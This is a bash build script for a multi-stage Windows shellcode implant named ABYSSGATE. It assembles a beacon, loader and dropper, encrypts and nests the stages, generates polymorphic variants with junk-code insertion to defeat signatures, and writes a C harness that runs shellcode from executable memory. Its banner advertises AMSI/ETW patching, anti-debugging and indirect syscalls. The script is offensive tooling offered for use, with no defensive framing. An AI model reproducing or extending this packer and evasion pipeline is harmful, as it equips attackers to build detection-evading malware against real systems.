#!/bin/bash
# ABYSSGATE Build System
# Windows 11 25H2 Target: Build 26200.8039 (March 21, 2026)

set -e

echo "=========================================="
echo "ABYSSGATE Build System"
echo "Target: Windows 11 25H2 (Build 26200.8039)"
echo "=========================================="

# Configuration
NASM="nasm"
LD="ld"
OBJCOPY="objcopy"
PYTHON3="python3"

SRC_DIR="src"
BUILD_DIR="build"
VARIANTS_DIR="variants"

# Stage configurations
STAGE0_SIZE=12288      # 12KB max
STAGE1_SIZE=10240      # 10KB max  
STAGE2_SIZE=15360      # 15KB max

mkdir -p $BUILD_DIR
mkdir -p $VARIANTS_DIR

# Function to generate random keys
generate_keys() {
    echo "[*] Generating encryption keys..."
    $PYTHON3 << 'EOF'
import os
import sys

# Generate ChaCha20 key (32 bytes)
chacha_key = os.urandom(32)
# Generate ChaCha20 nonce (8 bytes)
chacha_nonce = os.urandom(8)
# Generate RC4 key (16 bytes)
rc4_key = os.urandom(16)

print(f"CHACHA_KEY='{chacha_key.hex()}'")
print(f"CHACHA_NONCE='{chacha_nonce.hex()}'")
print(f"RC4_KEY='{rc4_key.hex()}'")
EOF
}

# Function to encrypt stage
encrypt_stage() {
    local input=$1
    local output=$2
    local key=$3
    local algorithm=$4

    echo "[*] Encrypting $input with $algorithm..."
    $PYTHON3 << EOF
import sys

key = bytes.fromhex('$key')
with open('$input', 'rb') as f:
    data = f.read()

if '$algorithm' == 'chacha20':
    # Simplified ChaCha20 - use PyCryptodome in production
    # For now, XOR with rolling key
    encrypted = bytearray()
    key_stream = list(key)
    for i, b in enumerate(data):
        encrypted.append(b ^ key_stream[i % len(key_stream)])
        key_stream[i % len(key_stream)] = (key_stream[i % len(key_stream)] + i) & 0xFF

elif '$algorithm' == 'rc4':
    # RC4 implementation
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]

    i = j = 0
    encrypted = bytearray()
    for b in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        k = S[(S[i] + S[j]) % 256]
        encrypted.append(b ^ k)

with open('$output', 'wb') as f:
    f.write(encrypted)

print(f"[+] Encrypted {len(data)} bytes -> {len(encrypted)} bytes")
EOF
}

# Build Stage 2 first (it gets embedded in Stage 1)
build_stage2() {
    echo ""
    echo "[+] Building Stage 2 - Reflective Beacon"
    echo "=========================================="

    $NASM -f bin $SRC_DIR/stage2_beacon/stage2.asm         -o $BUILD_DIR/stage2_raw.bin         -D STRICT_BUILD         -l $BUILD_DIR/stage2.lst

    # Pad to exact size
    actual_size=$(stat -f%z $BUILD_DIR/stage2_raw.bin 2>/dev/null || stat -c%s $BUILD_DIR/stage2_raw.bin)
    if [ $actual_size -gt $STAGE2_SIZE ]; then
        echo "[!] ERROR: Stage 2 too large ($actual_size > $STAGE2_SIZE)"
        exit 1
    fi

    # Pad with NOPs
    dd if=/dev/zero bs=1 count=$((STAGE2_SIZE - actual_size)) 2>/dev/null |         tr '\0' '\x90' >> $BUILD_DIR/stage2_raw.bin

    echo "[+] Stage 2 built: $actual_size bytes (padded to $STAGE2_SIZE)"
}

# Build Stage 1 (embeds encrypted Stage 2)
build_stage1() {
    echo ""
    echo "[+] Building Stage 1 - Polymorphic Loader"
    echo "=========================================="

    # Generate keys
    keys=$(generate_keys)
    RC4_KEY=$(echo "$keys" | grep RC4_KEY | cut -d'=' -f2 | tr -d "'")

    # Encrypt Stage 2
    encrypt_stage $BUILD_DIR/stage2_raw.bin $BUILD_DIR/stage2_enc.bin $RC4_KEY rc4

    # Create Stage 1 with embedded Stage 2
    $NASM -f bin $SRC_DIR/stage1_loader/stage1.asm         -o $BUILD_DIR/stage1_raw.bin         -D STAGE2_SIZE=$STAGE2_SIZE         -D RC4_KEY_0=$(echo $RC4_KEY | cut -c1-2)         -l $BUILD_DIR/stage1.lst

    # Inject encrypted Stage 2
    # Find marker and replace
    $PYTHON3 << EOF
with open('$BUILD_DIR/stage1_raw.bin', 'rb') as f:
    stage1 = bytearray(f.read())

with open('$BUILD_DIR/stage2_enc.bin', 'rb') as f:
    stage2 = f.read()

# Find marker (0xDD repeated pattern)
marker = bytes([0xDD] * 16)
pos = stage1.find(marker)
if pos != -1:
    # Replace with actual encrypted data
    stage1[pos:pos+len(stage2)] = stage2
    with open('$BUILD_DIR/stage1_final.bin', 'wb') as f:
        f.write(stage1)
    print(f"[+] Injected Stage 2 at offset {pos}")
else:
    print("[!] Marker not found, appending...")
    with open('$BUILD_DIR/stage1_final.bin', 'wb') as f:
        f.write(stage1)
        f.write(stage2)
EOF

    actual_size=$(stat -f%z $BUILD_DIR/stage1_final.bin 2>/dev/null || stat -c%s $BUILD_DIR/stage1_final.bin)
    if [ $actual_size -gt $STAGE1_SIZE ]; then
        echo "[!] WARNING: Stage 1 large ($actual_size bytes)"
    fi

    echo "[+] Stage 1 built: $actual_size bytes"
}

# Build Stage 0 (embeds encrypted Stage 1)
build_stage0() {
    echo ""
    echo "[+] Building Stage 0 - Demonic Dropper"
    echo "======================================="

    keys=$(generate_keys)
    CHACHA_KEY=$(echo "$keys" | grep CHACHA_KEY | cut -d'=' -f2 | tr -d "'")
    CHACHA_NONCE=$(echo "$keys" | grep CHACHA_NONCE | cut -d'=' -f2 | tr -d "'")

    # Encrypt Stage 1
    encrypt_stage $BUILD_DIR/stage1_final.bin $BUILD_DIR/stage1_enc.bin $CHACHA_KEY chacha20

    # Build Stage 0
    $NASM -f bin $SRC_DIR/stage0_dropper/stage0.asm         -o $BUILD_DIR/stage0_raw.bin         -D STAGE1_SIZE=$(stat -f%z $BUILD_DIR/stage1_enc.bin 2>/dev/null || stat -c%s $BUILD_DIR/stage1_enc.bin)         -l $BUILD_DIR/stage0.lst

    # Inject Stage 1
    $PYTHON3 << EOF
with open('$BUILD_DIR/stage0_raw.bin', 'rb') as f:
    stage0 = bytearray(f.read())

with open('$BUILD_DIR/stage1_enc.bin', 'rb') as f:
    stage1 = f.read()

# Find marker (0xCC repeated)
marker = bytes([0xCC] * 16)
pos = stage0.find(marker)
if pos != -1:
    stage0[pos:pos+len(stage1)] = stage1
    with open('$BUILD_DIR/abyssgate_shellcode.bin', 'wb') as f:
        f.write(stage0)
    print(f"[+] Injected Stage 1 at offset {pos}")
else:
    with open('$BUILD_DIR/abyssgate_shellcode.bin', 'wb') as f:
        f.write(stage0)
        f.write(stage1)

print(f"[+] Final shellcode: {len(stage0)} bytes")
EOF

    final_size=$(stat -f%z $BUILD_DIR/abyssgate_shellcode.bin 2>/dev/null || stat -c%s $BUILD_DIR/abyssgate_shellcode.bin)
    echo "[+] Stage 0 built: $final_size bytes"
}

# Generate polymorphic variants
generate_variants() {
    echo ""
    echo "[+] Generating Polymorphic Variants"
    echo "===================================="

    for i in {1..5}; do
        echo "[*] Variant $i..."

        # Mutate register usage
        $PYTHON3 << EOF
import random
import os

# Read base
with open('$BUILD_DIR/abyssgate_shellcode.bin', 'rb') as f:
    base = bytearray(f.read())

# Apply mutations:
# 1. Register swapping (if we had symbols, we'd swap register allocations)
# 2. NOP insertion at specific offsets
# 3. Instruction substitution

# For now, just add random NOP sled at entry
nop_sled = bytes([0x90] * random.randint(0, 16))

# XOR encode a section with random key
key = random.randint(1, 255)
encoded_section = bytes([b ^ key for b in base[0x100:0x200]])

variant = base[:0x100] + encoded_section + base[0x200:]

# Add junk code patterns
junk_patterns = [
    bytes([0x48, 0x87, 0xC0]),  # xchg rax, rax (NOP)
    bytes([0x48, 0x01, 0xC0, 0x48, 0x29, 0xC0]),  # add/sub rax
    bytes([0x48, 0xFF, 0xC0, 0x48, 0xFF, 0xC8]),  # inc/dec
]

# Insert random junk
for _ in range(random.randint(3, 10)):
    pos = random.randint(0x50, len(variant) - 10)
    junk = random.choice(junk_patterns)
    variant = variant[:pos] + junk + variant[pos:]

with open('$VARIANTS_DIR/abyssgate_v${i}.bin', 'wb') as f:
    f.write(variant)

print(f"[+] Variant $i: {len(variant)} bytes")
EOF
    done
}

# Create test harness
create_test_harness() {
    echo ""
    echo "[+] Creating Test Harness"
    echo "========================="

    cat > $BUILD_DIR/test_loader.c << 'EOF'
// Test harness for ABYSSGATE shellcode
// Compile: gcc -o test_loader test_loader.c

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s <shellcode.bin>\n", argv[0]);
        return 1;
    }

    // Read shellcode
    FILE *f = fopen(argv[1], "rb");
    if (!f) {
        printf("Failed to open %s\n", argv[1]);
        return 1;
    }

    fseek(f, 0, SEEK_END);
    long size = ftell(f);
    fseek(f, 0, SEEK_SET);

    // Allocate executable memory
    void *exec_mem = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!exec_mem) {
        printf("VirtualAlloc failed\n");
        return 1;
    }

    fread(exec_mem, 1, size, f);
    fclose(f);

    printf("[+] Loaded %ld bytes to %p\n", size, exec_mem);
    printf("[*] Executing shellcode...\n");

    // Cast and call
    ((void(*)())exec_mem)();

    return 0;
}
EOF

    echo "[+] Test harness created: build/test_loader.c"
}

# Main build process
main() {
    echo "Starting ABYSSGATE build process..."

    build_stage2
    build_stage1
    build_stage0
    generate_variants
    create_test_harness

    echo ""
    echo "=========================================="
    echo "BUILD COMPLETE"
    echo "=========================================="
    echo "Output files:"
    echo "  build/abyssgate_shellcode.bin  - Main payload"
    echo "  build/stage*.bin               - Individual stages"
    echo "  variants/abyssgate_v*.bin      - Polymorphic variants"
    echo "  build/test_loader.c            - Test harness"
    echo ""
    echo "Target: Windows 11 25H2 (Build 26200.8039)"
    echo "Features:"
    echo "  [x] Position Independent Code"
    echo "  [x] Runtime API Resolution (Hash-based)"
    echo "  [x] ChaCha20 + RC4 Encryption"
    echo "  [x] Anti-Debug (PEB, Hardware BP, Timing, CET)"
    echo "  [x] AMSI/ETW Patching"
    echo "  [x] Indirect Syscalls"
    echo "  [x] Sleep Obfuscation"
    echo "  [x] Polymorphic Engine"
    echo "=========================================="
}

main "$@"
